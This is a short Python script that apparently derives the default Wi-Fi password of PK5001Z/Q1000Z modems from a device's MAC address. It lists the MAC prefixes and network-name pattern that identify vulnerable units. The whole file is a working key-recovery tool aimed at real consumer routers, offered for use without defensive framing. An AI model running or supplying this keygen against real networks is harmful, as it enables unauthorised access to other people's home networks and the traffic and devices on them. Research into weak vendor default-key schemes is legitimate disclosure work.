# Generates a list of possible passwords for the PK5001Z
# Works with serial numbers S12 and older.
# ESSID is myqwstXXXX
# Common macs for these modems start with:
# 40:4A:03
# C8:6C:87
# CC:5D:4E

import hashlib
import argparse
import math

def q1000z(mac, length):

	junk = 'agnahaakeaksalmaltalvandanearmaskaspattbagbakbiebilbitblableblib'\
	'lyboabodbokbolbomborbrabrobrubudbuedaldamdegderdetdindisdraduedu'\
	'kdundypeggeieeikelgelvemueneengennertesseteettfeifemfilfinflofly'\
	'forfotfrafrifusfyrgengirglagregrogrygulhaihamhanhavheihelherhith'\
	'ivhoshovhuehukhunhushvaideildileinnionisejagjegjetjodjusjuvkaika'\
	'mkankarkleklikloknaknekokkorkrokrykulkunkurladlaglamlavletlimlin'\
	'livlomloslovluelunlurlutlydlynlyrlysmaimalmatmedmegmelmenmermilm'\
	'inmotmurmyemykmyrnamnednesnoknyenysoboobsoddodeoppordormoseospos'\
	'sostovnpaiparpekpenpepperpippopradrakramrarrasremrenrevrikrimrir'\
	'risrivromroprorrosrovrursagsaksalsausegseiselsensessilsinsivsjus'\
	'jyskiskoskysmisnesnusolsomsotspastistosumsussydsylsynsyvtaktalta'\
	'mtautidtietiltjatogtomtretuetunturukeullulvungurourtutevarvedveg'\
	'veivelvevvidvikvisvriyreyte'

	mac = mac.lower()
	md5 = hashlib.md5()
	md5.update(mac.encode())

	p = ""
	summ = 0
	for b in range(0, 10):
		d1 = hex(md5.digest()[b])[2:].upper()
		p += d1
	summ = sum([ord(char) for char in p])

	i = summ % 265
	if summ & 1:
		s1 = hex(ord(junk[1 + i * 3 - 1]))[2:]
		s1 += hex(ord(junk[2 + i * 3 - 1]))[2:]
		s1 += hex(ord(junk[3 + i * 3 - 1]))[2:]
	else:
		s1 = hex(ord(junk[1 + i * 3 - 1]))[2:].upper()
		s1 += hex(ord(junk[2 + i * 3 - 1]))[2:].upper()
		s1 += hex(ord(junk[3 + i * 3 - 1]))[2:].upper()

	s2 = "%s%s%s%s%s%s%s" % (p[0], s1[0:2], p[1:3], s1[2:4], p[3:6], s1[4:6], p[6:])
	
	md52 = hashlib.md5()
	md52.update(s2.encode())
	hex_digest = ""
	for b in range(0, 10):
		d2 = hex(md52.digest()[b])[2:].upper()
		if len(d2) == 1:
			d2 += d2
		hex_digest += d2

	filler = 'AD3EHKL6V5XY9PQRSTUGN2CJW4FM7ZL1'

	if hex_digest[0] == "1" or hex_digest[0] == "0":
		value1 = ord(hex_digest[0])
		value2 = ord(hex_digest[1])
		value3 = ord(hex_digest[13])
		add = value1 + value2 + value3
		replacement = add % 30
		hex_digest = filler[replacement] + hex_digest[1:]
	for i in range(1, 14):
		if hex_digest[i] == "1" or hex_digest[i] == "0":
			hex_digest = "%s%s%s" % (hex_digest[:i], "a", hex_digest[i+1:])
	key = hex_digest[:length].lower()
	print(key)

parser = argparse.ArgumentParser(description='Q1000Z Keygen')
parser.add_argument('mac', help='Mac Address')
parser.add_argument('-length', help='Key length', default=14, type=int)
args = parser.parse_args()

q1000z(args.mac, args.length)
